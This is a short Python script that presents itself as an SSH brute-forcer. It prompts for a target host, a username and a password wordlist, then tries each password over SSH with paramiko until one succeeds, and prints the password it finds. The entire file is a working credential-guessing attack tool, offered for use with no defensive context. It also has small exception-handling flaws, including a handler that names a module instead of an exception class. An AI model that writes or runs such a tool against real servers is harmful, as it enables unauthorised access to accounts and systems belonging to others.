import paramiko , sys, os, socket, termcolor
from paramiko import ssh_exception


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password, auth_timeout=0.1)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    except socket.gaierror:
        code = 2
    except ssh_exception:
        code = 2        

    ssh.close()
    return code        

        


host = input("[+] Target Address: ")
username = input("[+] Target Username: ")
worldlist = input("[+] Wordlist: ")
print('')
print(termcolor.colored(('-'*20), 'red'))
print(termcolor.colored(('|  SSH BRUTEFORCER  |'), 'green'))
print(termcolor.colored(('-'*20), 'red'))
print()
print("It might take a while to start, So sit back and relax..")
print()

if os.path.exists(worldlist) == False:
    print('[!!] The file/path does not exist')
    sys.exit(1)

with open(worldlist, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                state = "[+] Password Found "+password+" for the account "+username
                print(termcolor.colored((state),'green'))
                break
            elif response == 1:
                state = "[-] Incorrect Password "+password
                print(termcolor.colored((state), 'red'))
            elif response == 2:
                state = "'[!!] Cannot connect to the host'"
                print(termcolor.colored((state), 'blue'))
                sys.exit(1)         
        except Exception as e:
            print(e)
            pass